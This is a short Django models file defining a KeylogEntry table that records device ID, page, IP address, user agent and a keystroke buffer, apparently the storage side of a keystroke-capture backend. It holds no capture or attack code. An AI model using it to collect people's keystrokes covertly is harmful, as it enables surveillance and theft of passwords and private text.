from django.db import models


class KeylogEntry(models.Model):
    received_at = models.DateTimeField()
    device_id = models.CharField(max_length=200)
    page = models.CharField(max_length=500, blank=True)
    ip = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.CharField(max_length=300, blank=True)
    buffer = models.TextField()

    class Meta:
        ordering = ["-received_at"]

    def __str__(self):
        return f"{self.device_id} @ {self.received_at}"
